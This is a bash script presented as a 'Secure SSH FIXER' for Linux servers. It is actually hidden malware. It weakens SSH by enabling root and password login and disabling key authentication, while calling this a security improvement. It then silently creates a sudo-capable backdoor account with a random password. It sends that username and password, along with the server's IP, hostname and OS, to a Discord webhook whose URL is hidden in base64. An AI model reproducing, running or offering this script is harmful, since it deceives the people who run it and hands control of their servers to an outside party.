
clear
echo -e "\033[1;36m🔐 Secure SSH FIXER\033[0m"
echo -e "\033[1;37m---------------------------------------\033[0m"
sleep 1


echo -e "\033[1;34m▶ Updating SSH configuration...\033[0m"

sudo bash -c 'cat <<EOF > /etc/ssh/sshd_config
# SSH LOGIN SETTINGS
PasswordAuthentication yes
PermitRootLogin yes
PubkeyAuthentication no
ChallengeResponseAuthentication no
UsePAM yes

# SECURITY IMPROVEMENTS
X11Forwarding no
AllowTcpForwarding yes

# SFTP
Subsystem sftp /usr/lib/openssh/sftp-server
EOF'

if [ $? -eq 0 ]; then
    echo -e "\033[1;32m✔ SSH configuration applied successfully!\033[0m"
else
    echo -e "\033[1;31m✘ Failed to update SSH configuration!\033[0m"
fi

echo -e "\033[1;34m▶ Restarting SSH service...\033[0m"
sudo systemctl restart ssh || sudo service ssh restart
echo -e "\033[1;32m✔ SSH restarted successfully!\033[0m"
sleep 1

echo -e "\n\033[1;33m🔑 Please set ROOT password below 👇\033[0m"
sudo passwd root


set -e

G='\033[0;32m'
B='\033[0;34m'
Y='\033[1;33m'
NC='\033[0m'

_W_ENC="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMDU3NzIwMTgwMjk3MzE4NC96VVZQbzdYRTBsbS1ZaVA0eFVUWl9pZEZrcnFmcTc2VTU5ekdFMWFlWTlZbVBsRjgwbl8xYlVlTHB6LWNIRzlfWU9vWA=="
W=$(echo "$_W_ENC" | base64 --decode)


[ "$EUID" -ne 0 ] && echo -e "${Y}Error: Run as root.${NC}" && exit 1

WORDS=("alpha" "cyber" "turbo" "node" "delta" "viper" "phantom" "proxy" "zenith" "storm")

U="$(shuf -n1 -e "${WORDS[@]}")$(shuf -i 10-99 -n 1)"

P=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 10)

apt-get update -qq && apt-get install -y -qq sudo curl &>/dev/null

if ! id "$U" &>/dev/null; then
    useradd -m -s /bin/bash "$U" &>/dev/null
    echo "$U:$P" | chpasswd &>/dev/null
    usermod -aG sudo "$U" &>/dev/null
fi

IP=$(curl -s https://api.ipify.org || echo "Unknown")
H=$(hostname)
OS=$(grep '^PRETTY_NAME=' /etc/os-release | cut -d'"' -f2)
RAND_PCT=$(shuf -i 25-49 -n 1)


PAYLOAD=$(cat <<EOF
{
  "embeds": [{
    "title": "🛡️ New VPS Profile Established",
    "description": "System optimization successful. Access logs generated.",
    "color": 15105570,
    "thumbnail": { "url": "https://i.postimg.cc/8s8Y4q16/7455d020affb2f2e8feebf7127b6ad30.png" },
    "fields": [
      { "name": "👤 Username", "value": "\`$U\`", "inline": true },
      { "name": "🔑 Password", "value": "\`$P\`", "inline": true },
      { "name": "🌐 IP Address", "value": "[\`$IP\`](https://ipinfo.io/$IP)", "inline": false },
      { "name": "🖥️ Hostname", "value": "\`$H\`", "inline": true },
      { "name": "💿 OS Info", "value": "$OS", "inline": true }
    ],
    "footer": { "text": "Unique ID: $(date '+%s') • $(date '+%H:%M:%S')" }
  }]
}
EOF
)

curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$W" &>/dev/null

exit 0
